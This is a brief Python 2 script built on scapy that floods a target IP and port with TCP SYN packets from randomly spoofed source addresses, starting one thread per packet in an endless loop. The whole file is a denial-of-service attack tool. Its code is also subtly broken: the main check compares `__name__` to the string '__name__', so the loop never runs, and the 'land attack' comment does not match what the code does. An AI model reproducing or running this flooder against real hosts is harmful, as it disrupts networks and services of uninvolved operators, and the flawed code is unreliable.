#!/usr/bin/env python
# syn attack,, land attack
import random
import sys
import threading
# from scapy.all import *
from scapy.all import conf, IP, TCP, send


# network card XD
conf.iface = 'en1'


class sendSYN(threading.Thread):
    def __init__(self, target, port):
        self.target = target
        self.port = port
        threading.Thread.__init__(self)

    def run(self):
        i = IP()
        i.src = "%i.%i.%i.%i" % (random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
        i.dst = self.target

        t = TCP()
        t.sport = random.randint(1, 65535)
        t.dport = self.port
        t.flags = 'S'

        send(i / t, verbose=0)

if __name__ == '__name__':
    if len(sys.argv) != 3:
        print "Usage: %s <Target IP> <Port>" % sys.argv[0]
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2])

    total = 0
    print "Flooding %s:%i with SYN packets." % (target, port)
    while 1:
            sendSYN(target, port).start()
            total += 1
            sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
